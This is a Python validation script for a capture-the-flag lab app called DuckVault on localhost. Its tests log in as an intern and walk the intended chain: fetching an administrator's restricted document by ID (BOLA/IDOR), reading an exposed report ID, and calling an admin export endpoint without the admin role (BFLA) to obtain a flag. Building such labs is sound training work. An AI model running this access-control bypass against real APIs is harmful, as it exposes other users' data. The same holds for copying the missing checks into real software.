import re
import requests

BASE_URL = "http://localhost:8000"


def test_health():
    response = requests.get(f"{BASE_URL}/health")
    assert response.status_code == 200
    assert response.json()["status"] == "ok"
    print("[OK] Health check passed")


def test_login(session):
    response = session.post(
        f"{BASE_URL}/login",
        data={
            "username": "intern",
            "password": "intern123",
        },
        allow_redirects=False,
    )

    assert response.status_code in [302, 303]
    assert "session" in session.cookies.get_dict()
    print("[OK] Login passed")


def test_assigned_document(session):
    response = session.get(f"{BASE_URL}/api/documents/1042")
    assert response.status_code == 200

    data = response.json()
    assert data["id"] == 1042
    assert data["owner"] == "intern"
    assert data["classification"] == "INTERNAL"

    print("[OK] Assigned document access passed")


def test_bola_restricted_document(session):
    response = session.get(f"{BASE_URL}/api/documents/1044")
    assert response.status_code == 200

    data = response.json()
    assert data["id"] == 1044
    assert data["owner"] == "administrator"
    assert data["classification"] == "RESTRICTED"
    assert "report_id=7331" in data["content"]

    print("[OK] BOLA restricted document access passed")


def test_report_metadata_no_flag(session):
    response = session.get(f"{BASE_URL}/api/reports/7331")
    assert response.status_code == 200

    data = response.json()
    assert data["id"] == 7331
    assert data["classification"] == "RESTRICTED_REPORT"
    assert data["export_required"] is True
    assert "flag" not in data

    print("[OK] Report metadata check passed")


def test_admin_export_bfla(session):
    response = session.post(
        f"{BASE_URL}/api/admin/exports",
        json={
            "report_id": 7331,
        },
    )

    assert response.status_code == 200

    data = response.json()
    assert data["export_status"] == "completed"
    assert data["required_role"] == "admin"
    assert data["current_role"] == "employee"
    assert data["access_control_status"] == "missing admin role validation"
    assert re.match(r"^DUCK\{bola_to_bfla_export_chain_[a-f0-9]{12}\}$", data["flag"])

    print("[OK] BFLA admin export and flag retrieval passed")


def main():
    session = requests.Session()

    test_health()
    test_login(session)
    test_assigned_document(session)
    test_bola_restricted_document(session)
    test_report_metadata_no_flag(session)
    test_admin_export_bfla(session)

    print("\nAll DuckVault validation checks passed.")
    print("The intended chain is working:")
    print("BOLA / IDOR -> Excessive Data Exposure -> BFLA -> Flag")


if __name__ == "__main__":
    main()
